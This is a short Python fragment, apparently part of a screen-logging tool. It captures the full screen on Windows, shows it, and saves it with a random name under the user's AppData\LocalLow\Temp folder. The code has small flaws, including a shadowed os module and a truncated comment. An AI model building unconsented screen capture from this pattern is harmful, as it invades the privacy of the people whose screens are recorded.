import pyscreenshot
import platform
import getpass
import random
import os
import threading 

def log_screenshot():  
    num = random.randint(1,10000000)
    os = platform.system()
    username = getpass.getuser()
    if(os == 'Windows'):
        # Capture the full screen
        image = pyscreenshot.grab()
        # Display the screenshot
        image.show()
        path = (f"C:\\Users\\{username}\\AppData\\LocalLow\\Temp\\{num}.png")
        print(f"SCREENSHOT TAKEN")
        #added later for 
        # Save the screenshot to a file
        image.save(path)
        
